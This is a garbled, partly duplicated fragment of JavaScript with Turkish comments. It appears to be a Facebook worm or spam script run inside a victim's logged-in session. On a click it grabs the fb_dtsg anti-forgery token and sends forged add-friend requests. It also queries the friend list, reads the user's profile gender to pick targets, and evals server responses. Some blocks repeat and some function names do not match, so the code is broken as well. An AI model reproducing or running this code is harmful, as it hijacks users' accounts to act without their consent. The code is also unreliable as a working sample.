                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?Ã‚Â¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?Ã‚Â¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}